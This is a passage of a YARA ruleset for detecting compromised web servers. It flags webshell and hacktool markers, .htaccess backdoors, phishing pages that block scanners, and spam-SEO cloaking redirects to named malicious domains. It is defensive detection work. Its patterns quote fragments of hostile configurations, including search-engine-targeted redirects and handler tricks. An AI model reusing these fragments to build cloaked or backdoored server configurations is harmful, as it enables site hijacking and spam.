        $trigger and PR00088 and PR00089 and PR00090
}

private rule PR00091 : trigger
{
    strings:
        $ps0 = "_SERVER["
    condition:
        $ps0
}

rule dir_hacktool_citadel_botnet_001 : hacktool
{
    strings:
        $trigger = "mysqlQueryEx('botnet_list'"
    condition:
        $trigger and PR00091
}

private rule PR00092 : trigger
{
    strings:
        $ps0 = "error_reporting(0)"
    condition:
        $ps0
}

rule dir_hacktool_remote_whm_creator_001 : hacktool
{
    strings:
        $trigger = "echo '    <center><b>Remote WHM Creator</b><br>"
    condition:
        $trigger and PR00092
}

private rule PR00093 : trigger
{
    strings:
        $ps0 = "AddType text/plain .php"
    condition:
        $ps0
}

rule htaccess_backdoor_cgienabler_004 : backdoor
{
    strings:
        $trigger = "<Files ^(*.txt)>"
    condition:
        $trigger and PR00093
}

private rule PR00094 : trigger
{
    strings:
        $ps0 = "check-script-vorking)"
    condition:
        $ps0
}

private rule PR00095 : trigger
{
    strings:
        $ps0 = ".%{ENV:SITE_WEB_SCRIPT_EXECUTE}?main-"
    condition:
        $ps0
}

rule htaccess_backdoor_script_execute_001 : backdoor
{
    strings:
        $trigger = "Rewrite"
    condition:
        $trigger and PR00094 and PR00095
}

private rule PR00096 : trigger
{
    strings:
        $ps0 = "FollowSymLinks"
    condition:
        $ps0
}

rule htaccess_hacktool_cgi_003 : hacktool
{
    strings:
        $trigger = "#Coded By Sole Sad"
    condition:
        $trigger and PR00096
}

private rule PR00097 : trigger
{
    strings:
        $ps0 = "RewriteRule"
    condition:
        $ps0
}

rule htaccess_hacktool_symlinkviewer_003 : hacktool
{
    strings:
        $trigger = "DirectoryIndex indoxploit"
    condition:
        $trigger and PR00097
}

private rule PR00098 : trigger
{
    strings:
        $ps0 = "185.93.187.90/"
    condition:
        $ps0
}

rule htaccess_malware_185_93_187_90_001 : malware
{
    strings:
        $trigger = "Rewrite"
    condition:
        $trigger and PR00098
}

rule htaccess_malware_browsercheck_001 : malware
{
    strings:
        $trigger = "/BrowserCheck"
    condition:
        $trigger and PR00097
}

private rule PR00099 : trigger
{
    strings:
        $ps0 = "?$3$1=$2&%{QUERY_STRING}"
    condition:
        $ps0
}

private rule PR00100 : trigger
{
    strings:
        $ps0 = "RewriteRule ^"
    condition:
        $ps0
}

private rule PR00101 : trigger
{
    strings:
        $ps0 = ".php$ - [L]"
    condition:
        $ps0
}

rule htaccess_malware_generic_010 : malware
{
    strings:
        $trigger = ".*P.*L.*-.*J.*PH"
    condition:
        $trigger and PR00099 and PR00100 and PR00101
}

rule htaccess_malware_generic_011 : malware
{
    strings:
        $trigger = "RewriteCond %{REQUEST_URI}%{QUERY_STRING} valium"
    condition:
        $trigger
}

private rule PR00102 : trigger
{
    strings:
        $ps0 = "DirectoryIndex Sux.html"
    condition:
        $ps0
}

rule htaccess_malware_generic_012 : malware
{
    strings:
        $trigger = "AddHandler"
    condition:
        $trigger and PR00102
}

// MANUAL FIX NECESSARY
rule htaccess_malware_generic_013 : malware
{
    strings:
        $trigger = "AddHandler"
        $htaccess_malware_generic_013_r0 = /Options\s*Indexes\s*FollowSymLinks\s*DirectoryIndex\s*\w+\.(html?|phtml|js|php|asp)\s*(AddType\s*txt\s*\.php\s*AddHandler\s*txt\s*\.php|AddType\s*txt\s*\.html?\s*AddHandler\s*txt\s*\.html?)\s*(AddType\s*txt\s*\.php\s*AddHandler\s*txt\s*\.php|AddType\s*txt\s*\.html?\s*AddHandler\s*txt\s*\.html?)?\s*Options\s*\w+\s*(Options\s*\w+)?\s*ReadmeName\s*\w+\.txt/
    condition:
        $trigger and $htaccess_malware_generic_013_r0
}

private rule PR00103 : trigger
{
    strings:
        $ps0 = "RewriteRule ^(.*)\\/(gossaniferous)\\/([0-9]+)_([0-9]+).cgi$"
    condition:
        $ps0
}

rule htaccess_malware_generic_014 : malware
{
    strings:
        $trigger = "<IfModule mod_rewrite.c>"
    condition:
        $trigger and PR00103
}

private rule PR00104 : trigger
{
    strings:
        $ps0 = "<FilesMatch \"(index).php$\">"
    condition:
        $ps0
}

private rule PR00105 : trigger
{
    strings:
        $ps0 = "from all"
    condition:
        $ps0
}

rule htaccess_malware_generic_015_03 : malware
{
    strings:
        $trigger = "|suspected)$\">"
    condition:
        $trigger and PR00104 and PR00105
}

private rule PR00106 : trigger
{
    strings:
        $ps0 = "DirectoryIndex foxnoindex.html"
    condition:
        $ps0
}

private rule PR00107 : trigger
{
    strings:
        $ps0 = "Options Indexes FollowSymLinks"
    condition:
        $ps0
}

rule htaccess_malware_generic_019 : malware
{
    strings:
        $trigger = "HeaderName fox.txt"
    condition:
        $trigger and PR00106 and PR00107
}

private rule PR00108 : trigger
{
    strings:
        $ps0 = "DirectoryIndex foxNo.html"
    condition:
        $ps0
}

rule htaccess_malware_generic_020 : malware
{
    strings:
        $trigger = "HeaderName Fox.txt"
    condition:
        $trigger and PR00108 and PR00107
}

private rule PR00109 : trigger
{
    strings:
        $ps0 = "<FilesMatch \".(phtml|"
    condition:
        $ps0
}

rule htaccess_malware_generic_024 : malware
{
    strings:
        $trigger = "|suspected)$\">"
    condition:
        $trigger and PR00105 and PR00109
}

rule htaccess_malware_safezone_001 : malware
{
    strings:
        $trigger = "/safezone"
    condition:
        $trigger and PR00097
}

private rule PR00110 : trigger
{
    strings:
        $ps0 = "/safezone [L,R=302]"
    condition:
        $ps0
}

rule htaccess_malware_safezone_002 : malware
{
    strings:
        $trigger = "Rewrite"
    condition:
        $trigger and PR00110
}

private rule PR00111 : trigger
{
    strings:
        $ps0 = "RewriteCond %{HTTP_REFERER} ^http(s)?://(www\\.)?http://safebrowsing-cache.google.com/.*$ [NC]"
    condition:
        $ps0
}

private rule PR00112 : trigger
{
    strings:
        $ps0 = "deny from google.com"
    condition:
        $ps0
}

rule htaccess_phishing_block_bots_001_02 : phishing
{
    strings:
        $trigger = "deny from 173.194."
    condition:
        $trigger and PR00111 and PR00112
}

private rule PR00113 : trigger
{
    strings:
        $ps0 = "google"
    condition:
        $ps0
}

rule htaccess_phishing_block_bots_003 : phishing
{
    strings:
        $trigger = "deny from virustotal.com"
    condition:
        $trigger and PR00080 and PR00113
}

private rule PR00114 : trigger
{
    strings:
        $ps0 = "# security-lab1.juniper.net "
    condition:
        $ps0
}

rule htaccess_phishing_block_bots_004 : phishing
{
    strings:
        $trigger = ".com"
    condition:
        $trigger and PR00114
}

rule htaccess_phishing_block_bots_005 : phishing
{
    strings:
        $trigger = "REQUE"
    condition:
        $trigger and PR00111
}

private rule PR00115 : trigger
{
    strings:
        $ps0 = "<Limit GET POST>"
    condition:
        $ps0
}

private rule PR00116 : trigger
{
    strings:
        $ps0 = "## USER IP BANNING"
    condition:
        $ps0
}

rule htaccess_phishing_denyusers_001 : phishing
{
    strings:
        $trigger = "deny from"
    condition:
        $trigger and PR00115 and PR00116
}

private rule PR00117 : trigger
{
    strings:
        $ps0 = "BEGIN SYSTEM API"
    condition:
        $ps0
}

private rule PR00118 : trigger
{
    strings:
        $ps0 = "myclearcode"
    condition:
        $ps0
}

rule htaccess_spamseo_clearcode_001 : spamseo
{
    strings:
        $trigger = "Rewrite"
    condition:
        $trigger and PR00117 and PR00118
}

private rule PR00119 : trigger
{
    strings:
        $ps0 = "doctorceme.ru/ [R,L]"
    condition:
        $ps0
}

rule htaccess_spamseo_doctorceme_ru_redirect_001 : spamseo
{
    strings:
        $trigger = "Rewrite"
    condition:
        $trigger and PR00119
}

private rule PR00120 : trigger
{
    strings:
        $ps0 = "404 http://doctorceme.ru"
    condition:
        $ps0
}

rule htaccess_spamseo_doctorceme_ru_redirect_001_02 : spamseo
{
    strings:
        $trigger = "Rewrite"
    condition:
        $trigger and PR00120
}

private rule PR00121 : trigger
{
    strings:
        $ps0 = "RewriteRule ^list.xml$"
    condition:
        $ps0
}

rule htaccess_spamseo_doorwayrewrite_002 : spamseo
{
    strings:
        $trigger = "RewriteRule ^goose-(.*).html$"
    condition:
        $trigger and PR00121
}

private rule PR00122 : trigger
{
    strings:
        $ps0 = "RewriteRule (.*"
    condition:
        $ps0
}

private rule PR00123 : trigger
{
    strings:
        $ps0 = ".php?q=$"
    condition:
        $ps0
}

rule htaccess_spamseo_doorwayrewrite_003 : spamseo
{
    strings:
        $trigger = ".*) /"
    condition:
        $trigger and PR00100 and PR00122 and PR00101 and PR00123
}

private rule PR00124 : trigger
{
    strings:
        $ps0 = "RewriteRule ^(.*)$ http://"
    condition:
        $ps0
}

rule htaccess_spamseo_doorwayrewrite_004 : spamseo
{
    strings:
        $trigger = "RewriteCond %{HTTP_REFERER} ^.*(google|ask|yahoo|"
    condition:
        $trigger and PR00124
}

rule htaccess_spamseo_doorwayrewrite_005 : spamseo
{
    strings:
        $trigger = "RewriteCond %{HTTP_REFERER} .*google.* [OR]"
    condition:
        $trigger and PR00124
}

private rule PR00125 : trigger
{
    strings:
        $ps0 = "RewriteCond %{HTTP_REFERER} .*inbox*"
    condition:
        $ps0
}

rule htaccess_spamseo_doorwayrewrite_006 : spamseo
{
    strings:
        $trigger = "RewriteCond %{HTTP_REFERER} .*mail* [OR]"
    condition:
        $trigger and PR00124 and PR00125
}

rule htaccess_spamseo_doorwayrewrite_007 : spamseo
{
    strings:
        $trigger = "##!!##!!##!!##!!##!!####!!##!!##!!##!!##!!##"
    condition:
        $trigger and PR00124
}

private rule PR00126 : trigger
{
    strings:
        $ps0 = "RewriteCond %{THE_REQUEST} ^[^/]*/index\\.php [NC]"
    condition:
        $ps0
}

rule htaccess_spamseo_doorwayrewrite_008 : spamseo
{
    strings:
        $trigger = "RewriteRule ^shop/(.*)$ themes/"
    condition:
        $trigger and PR00126
}

private rule PR00127 : trigger
{
    strings:
        $ps0 = "..*$ ?$2$4=$3&%{QUERY"
    condition:
        $ps0
}

rule htaccess_spamseo_doorwayrewrite_009 : spamseo
{
    strings:
        $trigger = "<IfModule mod_rewrite.c>"
    condition:
        $trigger and PR00100 and PR00127
}

private rule PR00128 : trigger
{
    strings:
        $ps0 = "RewriteCond %{HTTP_USER_AGENT}"
    condition:
        $ps0
}

private rule PR00129 : trigger
{
    strings:
        $ps0 = "RewriteRule ^("
    condition:
        $ps0
}

private rule PR00130 : trigger
{
    strings:
        $ps0 = "RewriteCond %{ENV:REDIRECT_STATUS} 200"
    condition:
        $ps0
}

rule htaccess_spamseo_doorway_002 : spamseo
{
    strings:
        $trigger = "RewriteCond %{HTTP_REFERER}"
        $htaccess_spamseo_doorway_002_w0 = "Comodo\\ DCV)?$"
    condition:
        $trigger and PR00128 and PR00129 and PR00130 and not $htaccess_spamseo_doorway_002_w0
}

private rule PR00131 : trigger
{
    strings:
        $ps0 = "RewriteRule ^([0-9]+)\\/([^\\d\\/]+)([0-9]+)"
    condition:
        $ps0
}

rule htaccess_spamseo_doorway_003_02 : spamseo
{
    strings:
        $trigger = ")([0-9]+)..*$ ?$2$1=$3&%{QUERY_STRING}[L]"
    condition:
        $trigger and PR00131
}

rule htaccess_spamseo_doorway_003_06 : spamseo
{
    strings:
        $trigger = "file.php?$1=$2-$3 [L]"
    condition:
        $trigger and PR00100
}

// MANUAL FIX NECESSARY
rule htaccess_spamseo_doorway_003_08 : spamseo
{
    strings:
        $trigger = "&%{QUERY_STRING} [L]"
        $htaccess_spamseo_doorway_003_08_r0 = /(RewriteRule \^[^\?]+\.php\?[\w]+=\$[^&\n]+&%\{QUERY_STRING\} \[L\][\s]*){3,}/
    condition:
        $trigger and PR00100 and $htaccess_spamseo_doorway_003_08_r0
}

rule htaccess_spamseo_doorway_003_10 : spamseo
{
    strings:
        $trigger = "*$ ?$2$3=$4&%{QUERY_STRING}[L]"
    condition:
        $trigger and PR00100
}

rule htaccess_spamseo_doorway_003_11 : spamseo
{
    strings:
        $trigger = "$ ?$2$1=$3&%{QUERY_STRING}[L]"
    condition:
        $trigger and PR00100
}

rule htaccess_spamseo_doorway_003_12 : spamseo
{
    strings:
        $trigger = "$ ?$1$3=$2&%{QUERY_STRING}[L]"
    condition:
        $trigger and PR00100
}

rule htaccess_spamseo_doorway_005 : spamseo
{
    strings:
        $trigger = "index.php?smsite=$1&smid=$3&smtemp=$2 [L]"
    condition:
        $trigger and PR00100
}

rule htaccess_spamseo_doorway_006 : spamseo
{
    strings:
        $trigger = ".html$ index.php?tempweb=$1&smid=$2"
    condition:
        $trigger and PR00100
}

private rule PR00132 : trigger
{
    strings:
        $ps0 = "RewriteRule ^index.php$ wp-content/"
    condition:
        $ps0
}

rule htaccess_spamseo_doorway_007 : spamseo
{
    strings:
        $trigger = "RewriteCond %{HTTP_USER_AGENT} (google|yahoo|msn|aol|bing|snsbot)"
    condition:
        $trigger and PR00132
}

private rule PR00133 : trigger
{
    strings:
        $ps0 = "RewriteCond %{HTTP_REFERER} ("
    condition:
        $ps0
}

private rule PR00134 : trigger
{
    strings:
        $ps0 = "RewriteCond %{HTTP_USER_AGENT} ("
    condition:
        $ps0
}

private rule PR00135 : trigger
{
    strings:
        $ps0 = ".php [L]"
    condition:
        $ps0
}

rule htaccess_spamseo_doorway_009 : spamseo
{
    strings:
        $trigger = "RewriteRule ^.*$"
    condition:
        $trigger and PR00133 and PR00134 and PR00130 and PR00135
}

private rule PR00136 : trigger
{
    strings:
        $ps0 = "$ /include.php?id=$1 [L]"
    condition:
        $ps0
}

rule htaccess_spamseo_doorway_010 : spamseo
{
    strings:
        $trigger = "<IfModule mod_rewrite.c>"
    condition:
        $trigger and PR00100 and PR00136
}

rule htaccess_spamseo_doorway_011 : spamseo
{
    strings:
        $trigger = "]+)\\/.*=.*\\/$ ?$"
    condition:
        $trigger and PR00100
}

// MANUAL FIX NECESSARY
rule htaccess_spamseo_doorway_012 : spamseo
{
    strings:
        $trigger = ".php$ - [L]"
        $htaccess_spamseo_doorway_012_r0 = /RewriteEngine\s+On\s+RewriteRule\s.\..\(\w+\[a-z\]\+map.\.xml..\s*\w+\/\$1\s[^\s*]*\s+RewriteRule.\^\.\*\(sitemap.\.xml\)\$\s*\w+\/\$1\s\[[^\s*]*/
    condition:
        $trigger and PR00100 and $htaccess_spamseo_doorway_012_r0
}

private rule PR00137 : trigger
{
    strings:
        $ps0 = "google(.*)\\.html$ wp-content/"
    condition:
        $ps0
}

rule htaccess_spamseo_google_verification_001 : spamseo
{
    strings:
        $trigger = "Rewrite"
    condition:
        $trigger and PR00137
}

rule htaccess_spamseo_google_verification_002 : spamseo
{
    strings:
        $trigger = "^google(.*)\\.html"
    condition:
        $trigger and PR00100
}

rule htaccess_spamseo_google_verification_003 : spamseo
{
    strings:
        $trigger = "RewriteRule ^(.*)-(.*)\\.html$ "
    condition:
        $trigger
}

private rule PR00138 : trigger
{
    strings:
        $ps0 = "RewriteRule ^(.*)$ http://mobile.googleadservices.at [L,R=302]"
    condition:
        $ps0
}

rule htaccess_spamseo_googleadservices_at_001 : spamseo
{
    strings:
        $trigger = "RewriteCond %{HTTP_ACCEPT} \"text/vnd.wap.wml|application/vnd.wap.xhtml+xml\" [NC,OR]"
    condition:
        $trigger and PR00138
}

rule htaccess_spamseo_gopni3g_001 : spamseo
{
    strings:
        $trigger = "RewriteRule ^([A-Za-z0-9-]+).html$ story.php?hl=$1 [L]"
    condition:
        $trigger
}

rule htaccess_spamseo_injector_045 : spamseo
{
    strings:
        $trigger = "RewriteCond %{REQUEST_FILENAME} !wp-include.php"
    condition:
        $trigger
}

// MANUAL FIX NECESSARY
rule htaccess_spamseo_injector_046 : spamseo
{
    strings:
        $trigger = "google"
        $htaccess_spamseo_injector_046_r0 = /RewriteRule.\..\w+\-\w+\.php/
    condition:
        $trigger and PR00080 and $htaccess_spamseo_injector_046_r0
}

private rule PR00139 : trigger
{
    strings:
        $ps0 = ".xml(\\.gz)?$"
    condition:
        $ps0
}

private rule PR00140 : trigger
{
    strings:
        $ps0 = ".php?name=$1&%{QUERY_STRING} [L]"
    condition:
        $ps0
}

rule htaccess_spamseo_injector_047 : spamseo
{
    strings:
        $trigger = "RewriteCond %{REQUEST_FILENAME} !-f"
    condition:
        $trigger and PR00139 and PR00140 and PR00100
}

private rule PR00141 : trigger
{
    strings:
        $ps0 = "RewriteRule ^.+\\.txt$ http://"
    condition:
        $ps0
}

rule htaccess_spamseo_injector_048 : spamseo
{
    strings:
        $trigger = "RewriteCond %{REQUEST_FILENAME} !-f"
    condition:
        $trigger and PR00141
}

private rule PR00142 : trigger
{
    strings:
        $ps0 = "about.php|radio.php|index.php|content.php|lock360.php"
    condition:
        $ps0
}

rule htaccess_spamseo_injector_049 : spamseo
{
    strings:
        $trigger = "RewriteCond %{REQUEST_FILENAME} !-f"
    condition:
        $trigger and PR00100 and PR00142
}

rule htaccess_spamseo_redirect_001 : spamseo
{
    strings:
        $trigger = "RewriteCond %{HTTP_USER_AGENT} ^1207.*|^3gso.*|^4thp.*|^501i.*|^502i.*|^503i.*|"
    condition:
        $trigger
}

rule htaccess_spamseo_redirect_001_02 : spamseo
{
    strings:
        $trigger = "RewriteRule (.*) /phpinfo.php"
    condition:
        $trigger
}

rule htaccess_spamseo_redirect_001_03 : spamseo
{
    strings:
        $trigger = "RewriteCond %{HTTP_REFERER} ^http://[w.]*([^/]+)"
    condition:
        $trigger
}

rule htaccess_spamseo_redirect_001_04 : spamseo
{
    strings:
        $trigger = "RewriteRule ^(.*)$ http://gerania.r"
    condition:
        $trigger
}

rule htaccess_spamseo_redirect_001_05 : spamseo
{
    strings:
        $trigger = "RewriteCond %{HTTP_USER_AGENT} (mini\\ 9.5|vx1000|lge\\ |m800|e860|u940|ux840|compal|wireless|\\ mobi|ahong|lg380|lgku|lgu900|lg210|lg47|"
    condition:
        $trigger and PR00124
}

private rule PR00143 : trigger
{
    strings:
        $ps0 = "http://trusted-online-casinos2014.com  [R=301,L]"
    condition:
        $ps0
}

rule htaccess_spamseo_redirect_001_06 : spamseo
{
    strings:
        $trigger = "Rewrite"
    condition:
        $trigger and PR00143
}

private rule PR00144 : trigger
{
    strings:
        $ps0 = "%{HTTP_USER_AGENT} android|avantgo"
    condition:
        $ps0
}

private rule PR00145 : trigger
{
    strings:
        $ps0 = "RewriteRule ^$ http://"
    condition:
        $ps0
}

rule htaccess_spamseo_redirect_001_07 : spamseo
{
    strings:
        $trigger = "your|zeto|zte\\-) [NC]"
    condition:
        $trigger and PR00144 and PR00145
}

rule htaccess_spamseo_redirect_001_08 : spamseo
{
    strings:
        $trigger = "RewriteRule ^(.*)$ http://coding-paradise.ru"
    condition:
        $trigger
}

private rule PR00146 : trigger
{
    strings:
        $ps0 = "jpartner.org [L,R=302]"
    condition:
        $ps0
}

rule htaccess_spamseo_redirect_002 : spamseo
{
    strings:
        $trigger = "Rewrite"
    condition:
        $trigger and PR00146
}

private rule PR00147 : trigger
{
    strings:
        $ps0 = "hostedd.ru [L,R=302]"
    condition:
        $ps0
}

rule htaccess_spamseo_redirect_002_02 : spamseo
{
    strings:
        $trigger = "Rewrite"
    condition:
        $trigger and PR00147
}

private rule PR00148 : trigger
{
    strings:
        $ps0 = "/top/top"
    condition:
        $ps0
}

private rule PR00149 : trigger
{
    strings:
        $ps0 = "RewriteCond %{HTTP_USER_AGENT} android"
    condition:
        $ps0
}

rule htaccess_spamseo_redirect_004 : spamseo
{
    strings:
        $trigger = "RewriteCond %{HTTP_USER_AGENT} ^(1207"
    condition:
        $trigger and PR00148 and PR00149
}

private rule PR00150 : trigger
{
    strings:
        $ps0 = "aspx\\?jumpid=0sichm [NC]"
    condition:
        $ps0
}

rule htaccess_spamseo_redirect_005 : spamseo
{
    strings:
        $trigger = "Rewrite"
    condition:
        $trigger and PR00150
}

// MANUAL FIX NECESSARY
private rule PR00151 : trigger
{
    strings:
        $ps0 = "RewriteRule ^.*$ index.php [L]"
    condition:
        $ps0
}

rule htaccess_spamseo_redirect_006_02 : spamseo
{
    strings:
        $trigger = "%{HTTP_USER_AGENT}"
        $htaccess_spamseo_redirect_006_02_r0 = /RewriteCond\s*\%{HTTP_USER_AGENT}\s*\((bing\||yahoo\||google\|)+[^\)]+\)\s*\[/
    condition:
        $trigger and PR00151 and $htaccess_spamseo_redirect_006_02_r0
}

private rule PR00152 : trigger
{
    strings:
        $ps0 = "redirect.php?"
    condition:
        $ps0
}

rule htaccess_spamseo_redirect_007 : spamseo
{
    strings:
        $trigger = "seznam"
    condition:
        $trigger and PR00152 and PR00097
}

rule htaccess_spamseo_redirect_008 : spamseo
{
    strings:
        $trigger = "Redirect 301 / http://loading-loading"
    condition:
        $trigger
}

private rule PR00153 : trigger
{
    strings:
        $ps0 = "<action type=\"Rewrite\" url=\"bot.asp\""
    condition:
        $ps0
}

private rule PR00154 : trigger
{
    strings:
        $ps0 = "cript\" stopProcessing=\"true\">"
    condition:
        $ps0
}

rule htaccess_spamseo_redirect_009 : spamseo
{
    strings:
        $trigger = "<add input=\"{HTTP_USER_AGENT}\" pattern=\"Googlebot"
    condition:
        $trigger and PR00153 and PR00154
}

rule htaccess_spamseo_redirect_010 : spamseo
{
    strings:
        $trigger = "RewriteCond %{HTTP_USER_AGENT} google [OR]"
    condition:
        $trigger and PR00100
}

rule htaccess_spamseo_redirect_011 : spamseo
{
    strings:
        $trigger = "/(.*)$ exploitation-ddene.php [QSA,L]"
    condition:
        $trigger and PR00100
}

private rule PR00155 : trigger
{
    strings:
        $ps0 = "^(http\\:\\/\\/)?([^\\/\\?]*\\.)?(wordpress|twit|tweet"
    condition:
        $ps0
}

rule htaccess_spamseo_redirect_012 : spamseo
{
    strings:
        $trigger = "Rewrite"
    condition:
        $trigger and PR00155
}

// MANUAL FIX NECESSARY
rule htaccess_spamseo_redirect_013 : spamseo
{
    strings:
        $trigger = "%{ENV:REDIRECT_STATUS}"
        $htaccess_spamseo_redirect_013_r0 = /RewriteCond\s*\%{HTTP_REFERER}\s*\([\|\s*googleyahoomsnaolbing]+\)/
    condition:
        $trigger and PR00124 and $htaccess_spamseo_redirect_013_r0
}

// MANUAL FIX NECESSARY
rule htaccess_spamseo_redirect_014 : spamseo
{
    strings:
        $trigger = "RewriteRule ^(.*)$ http://"
        $htaccess_spamseo_redirect_014_r0 = /RewriteCond %\{HTTP_USER_AGENT}[\s]*(\"A|(\.\*))ndroid[^(]+RewriteRule \^\(\.\*\)\$ http/
    condition:
        $trigger and $htaccess_spamseo_redirect_014_r0
}

// MANUAL FIX NECESSARY
rule htaccess_spamseo_redirect_015 : spamseo
{
    strings:
        $trigger = ".php?q=$"
        $htaccess_spamseo_redirect_015_r0 = /RewriteRule \^[^\s]+\(\.\*\)\$[\s]*[^\.]+\.php\?q=\$1[\s]*\[L\]/
        $htaccess_spamseo_redirect_015_r1 = /RewriteCond %\{REQUEST_FILENAME\}[^\n]+[\s]*RewriteRule \^[^\s]+\(\.\*\)\$[\s]*[^\.]+\.php\?q=\$1[\s]*\[L\]/
    condition:
        $trigger and PR00100 and PR00101 and $htaccess_spamseo_redirect_015_r0 and $htaccess_spamseo_redirect_015_r1
}

// MANUAL FIX NECESSARY
rule htaccess_spamseo_redirect_015_02 : spamseo
{
    strings:
        $trigger = ".php?q=$"
        $htaccess_spamseo_redirect_015_02_r0 = /RewriteRule \^[^\s]+\(\.\*\)\$[\s]*[^\.]+\.php\?q=\$1[\s]*\[L\]/
    condition:
        $trigger and PR00100 and PR00101 and $htaccess_spamseo_redirect_015_02_r0
}

private rule PR00156 : trigger
{
    strings:
        $ps0 = "/(.*)$ wp-content/plugins/"
    condition:
        $ps0
}

rule htaccess_spamseo_redirect_016 : spamseo
{
    strings:
        $trigger = "RewriteCond %{REQUEST_URI} !(\\.css|\\.js|\\.png|\\.jpg|\\.gif|robots\\.txt|\\.tmps|\\.php|\\.txt|\\.html)$ [NC]"
    condition:
        $trigger and PR00100 and PR00156 and PR00101
}

private rule PR00157 : trigger
{
    strings:
        $ps0 = "<IfModule mod_rewrite.c>"
    condition:
        $ps0
}

rule htaccess_spamseo_redirect_017 : spamseo
{
    strings:
        $trigger = ".html$ index.php?web="
    condition:
        $trigger and PR00100 and PR00157
}

// MANUAL FIX NECESSARY
rule htaccess_spamseo_redirect_018 : spamseo
{
    strings:
        $trigger = "RewriteCond %{HTTP_USER_AGENT} (google|yahoo"
        $htaccess_spamseo_redirect_018_w0 = "Comodo\\ DCV)?$"
        $htaccess_spamseo_redirect_018_r1 = /RewriteCond\s\%\{HTTP_USER_AGENT\}\s\(google\|yahoo[^\)]*\)\s+\[OR\]\s+RewriteCond\s\%\{HTTP_REFERER\}\s\(google\|/
    condition:
        $trigger and not $htaccess_spamseo_redirect_018_w0 and $htaccess_spamseo_redirect_018_r1
}

private rule PR00158 : trigger
{
    strings:
        $ps0 = "?$1$2=$3&%{QUERY_STRING}[L]"
    condition:
        $ps0
}

rule htaccess_spamseo_redirect_019 : spamseo
{
    strings:
        $trigger = "RewriteRule ^.*([^\\d\\/]+)\\/([0-9]+)-([0-9]+)\\/(.*)-.*\\/.*."
    condition:
        $trigger and PR00158 and PR00101
}

private rule PR00159 : trigger
{
    strings:
        $ps0 = "^GET$"
    condition:
        $ps0
}

private rule PR00160 : trigger
{
    strings:
        $ps0 = "!^.*(exactseek|Feed|Fetch|"
    condition:
        $ps0
}

rule htaccess_spamseo_redirect_020 : spamseo
{
    strings:
        $trigger = "^(http\\:\\/\\/)?([^\\/\\?]*\\.)?(tweet|twit|linkedin"
    condition:
        $trigger and PR00159 and PR00100 and PR00160
}

private rule PR00161 : trigger
{
    strings:
        $ps0 = "?degasify$3=$1&%{QUERY_STRING}[L]"
    condition:
        $ps0
}

rule htaccess_spamseo_redirect_021 : spamseo
{
    strings:
        $trigger = ".php$ - [L]"
    condition:
        $trigger and PR00100 and PR00161
}

// MANUAL FIX NECESSARY
private rule PR00162 : trigger
{
    strings:
        $ps0 = "%{HTTP_USER_AGENT}"
    condition:
        $ps0
}

rule htaccess_spamseo_redirect_022 : spamseo
{
    strings:
        $trigger = "Rewrite"
        $htaccess_spamseo_redirect_022_r0 = /RewriteCond\s*\%{HTTP_USER_AGENT}\s*\((bing\||yahoo\||google\|)+[^\)]+\)\s*\[/
        $htaccess_spamseo_redirect_022_r1 = /RewriteCond\s*\%{HTTP_USER_AGENT}\s*\((bing\||yahoo\||google\|)+[^\)]+\)\s*\[(NC|OR),(NC|OR)\]\s*RewriteCond\s*\%{HTTP_REFERER}\s*\((bing\||yahoo\||google\|)+[^\)]+\)\s*RewriteRule\s*\^\(\.\*\)\$\s*\w+\.\w+\s*\[L,QSA\]/
    condition:
        $trigger and PR00162 and $htaccess_spamseo_redirect_022_r0 and $htaccess_spamseo_redirect_022_r1
}

private rule PR00163 : trigger
{
    strings:
        $ps0 = "RewriteRule ^(.+).html$ wp-content/languages/img/"
    condition:
        $ps0
}

rule htaccess_spamseo_redirect_023 : spamseo
{
    strings:
        $trigger = ".php$ - [L]"
    condition:
        $trigger and PR00163
}

// MANUAL FIX NECESSARY
private rule PR00164 : trigger
{
    strings:
        $ps0 = ")([0-9]+)\\/nsx([0-9]+)\\/(.*)$ ?"
    condition:
        $ps0
}

rule htaccess_spamseo_redirect_024 : spamseo
{
    strings:
        $trigger = "RewriteRule ^\\/(.*)("
        $htaccess_spamseo_redirect_024_r0 = /\$[\d]=\$[\d]&%\{QUERY_STRING\}\[L\]/
    condition:
        $trigger and PR00101 and PR00164 and $htaccess_spamseo_redirect_024_r0
}

rule htaccess_spamseo_redirect_030 : spamseo
{
    strings:
        $trigger = "RewriteRule ^$ http://crazytds.club"
    condition:
        $trigger and PR00149
}

rule htaccess_spamseo_redirect_031 : spamseo
{
    strings:
        $trigger = "USER_AGENT} !(windows\\.nt|bsd|x11|unix|macos|macintosh|playstation|google|yandex|bot|libwww|msn|america|avant|download|fdm|maui|webmoney|windows-media-player) [NC]"
    condition:
        $trigger and PR00124
}

private rule PR00165 : trigger
{
    strings:
        $ps0 = "RewriteRule \\.(jpg|png|gif|jpeg|bmp)$ - [L]"
    condition:
        $ps0
}

private rule PR00166 : trigger
{
    strings:
        $ps0 = "RewriteCond %{HTTP_USER_AGENT} !windows-media-player [NC]"
    condition:
        $ps0
}

rule htaccess_spamseo_redirect_032 : spamseo
{
    strings:
        $trigger = "####GET####"
    condition:
        $trigger and PR00165 and PR00166 and PR00124
}

// MANUAL FIX NECESSARY
rule htaccess_spamseo_redirect_033 : spamseo
{
    strings:
        $trigger = "RewriteRule ^(.*)$ default.php?$1 [L,QSA]"
        $htaccess_spamseo_redirect_033_r0 = /RewriteCond\s*\%{HTTP_USER_AGENT}\s*\((bing\||yahoo\||google\|)+[^\)]+\)\s*\[/
    condition:
        $trigger and PR00162 and $htaccess_spamseo_redirect_033_r0
}

private rule PR00167 : trigger
{
    strings:
        $ps0 = "RewriteRule ^hot/(\\w+)i\\d+\\.do$ /wp-content/plugins/"
    condition:
        $ps0
}

rule htaccess_spamseo_redirect_034 : spamseo
{
    strings:
        $trigger = ".php$ - [L]"
    condition:
        $trigger and PR00167
}

private rule PR00168 : trigger
{
    strings:
        $ps0 = "deny from all"
    condition:
        $ps0
}

rule htaccess_spamseo_redirect_035 : spamseo
{
    strings:
        $trigger = "?key=5ed88d80c7ee4458c3714a64ef5203b4"
    condition:
        $trigger and PR00100 and PR00168
}

// MANUAL FIX NECESSARY
rule htaccess_spamseo_redirect_036 : spamseo
{
    strings:
        $trigger = "RewriteCond %{HTTP_ACCEPT} \"text/vnd.wap.wml|application/vnd.wap.xhtml+xml\" [NC,OR]"
        $htaccess_spamseo_redirect_036_r0 = /RewriteEngine On[\s]*RewriteCond %\{HTTP_ACCEPT\} \"text.vnd.wap.wml\|application.vnd.wap.xhtml\+xml\" \[NC,OR\][\s]*(RewriteCond %\{H[^\n]+\][\s]*){2,}RewriteRule \^\(\.\*\)\$ http[^\]]+\]/
    condition:
